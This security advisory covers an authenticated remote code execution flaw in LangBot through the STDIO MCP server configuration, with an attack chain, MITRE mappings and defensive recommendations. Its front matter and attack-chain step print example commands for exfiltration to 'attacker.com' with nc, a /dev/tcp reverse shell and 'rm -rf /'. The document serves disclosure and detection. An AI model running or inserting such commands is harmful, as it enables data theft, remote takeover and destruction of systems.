---
title: Authenticated Remote Code Execution in LangBot via MCP Configuration (CVE-2026-54449)
slug: 2026-07-langbot-authenticated-rce
description: An authenticated remote code execution vulnerability (CVE-2026-54449) exists in LangBot versions up to and including 4.10.5, allowing any authenticated user to achieve arbitrary command execution by modifying the MCP Server Configuration to include a crafted STDIO MCP command, enabling system takeover, data exfiltration, or reverse shells on affected instances.
date: "2026-07-15T17:41:12Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - rce
  - command-injection
  - linux
  - web-application
  - supply-chain
vendors:
  - LangBot
products:
  - LangBot (<= 4.10.5)
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: Any authenticated user can achieve arbitrary command execution on the LangBot servers through changing the MCP Server Configuration by added an 'STDIO' MCP with an arbitrary command.
    confidence_band: high
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1071
    technique_name: Application Layer Protocol
    evidence: opening a reverse shell (bash -i >& /dev/tcp/10.0.0.1/8080 0>&1)
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1041
    technique_name: Exfiltration Over C2 Channel
    evidence: data exfiltration (cat /etc/passwd | nc attacker.com 4444)
    confidence_band: high
  - tactic_id: TA0040
    tactic_name: Impact
    technique_id: T1485
    technique_name: Data Destruction
    evidence: potentially removing the whole machine's data (rm -rf / --no-preserve-root)
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-3pvh-63gf-j9mw
  - https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/
  - https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/
rules:
  - title: Detects CVE-2026-54449 Exploitation - LangBot RCE Command Execution
    description: Detects command execution patterns indicative of CVE-2026-54449 exploitation in LangBot, including reverse shells, data exfiltration, and destructive commands.
    platform: sigma
    severity: high
    tactics:
      - command_and_control
      - execution
      - exfiltration
      - impact
    techniques:
      - T1041
      - T1059.004
      - T1071.001
      - T1485
    data_sources:
      - process_creation
      - linux
rules_count: 1
---

A critical authenticated remote code execution (RCE) vulnerability, tracked as CVE-2026-54449 (CWE-78: OS Command Injection), affects LangBot servers up to and including version 4.10.5. This flaw allows any authenticated user to execute arbitrary commands on the underlying operating system. The vulnerability stems from the `StdioServerParameters` component, imported from Anthropic's `modelcontextprotocol` open source, which directly executes user-supplied commands via a subprocess. An attacker with valid credentials can leverage the "MCP Server Configuration" feature by adding an "STDIO" type MCP with a malicious command. This poses a significant risk to publicly available LangBot instances, enabling full system takeover, data exfiltration, reverse shell establishment, or complete data destruction. The impact extends to local instances, facilitating lateral movement within internal networks.

## Attack Chain

1. An attacker obtains or uses existing valid credentials to log in and access the LangBot server's web interface.
2. The attacker navigates to the "Extensions" section within the authenticated LangBot interface.
3. The attacker proceeds to the "MCP" tab and initiates the process to add a new MCP server configuration.
4. The attacker selects "STDIO" as the server configuration type, which is vulnerable to command injection.
5. The attacker inputs an arbitrary malicious command into the configuration field, such as `cat /etc/passwd | nc attacker.com 4444` for data exfiltration, `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` for a reverse shell, or `rm -rf / --no-preserve-root` for data destruction.
6. The LangBot service processes this new MCP configuration, causing the `StdioServerParameters` component to execute the attacker-supplied command on the underlying Linux server.
7. The malicious command executes with the privileges of the LangBot service user, achieving the attacker's objective, whether it be establishing command and control, exfiltrating sensitive data, or performing destructive actions.

## Impact

This vulnerability (CVE-2026-54449) represents a severe authenticated remote code execution risk. Any publicly exposed LangBot instance running versions 4.10.5 or earlier is susceptible to complete compromise if an attacker can gain authenticated access. Successful exploitation allows for full system takeover, leading to the potential for sensitive data exfiltration (e.g., `/etc/passwd`), the establishment of persistent remote access via reverse shells, or even the complete destruction of the machine's data (`rm -rf /`). For internal deployments, this RCE can facilitate lateral movement within the network, allowing attackers to pivot to other systems.

## Recommendation

* Patch LangBot to a version greater than 4.10.5 immediately to address CVE-2026-54449.
* Deploy the provided Sigma rule to detect common command injection patterns and post-exploitation activities, such as reverse shells or data exfiltration attempts.
* Enable comprehensive process creation logging (e.g., using Sysmon for Linux or auditd) on all servers hosting LangBot to capture the execution of suspicious commands.
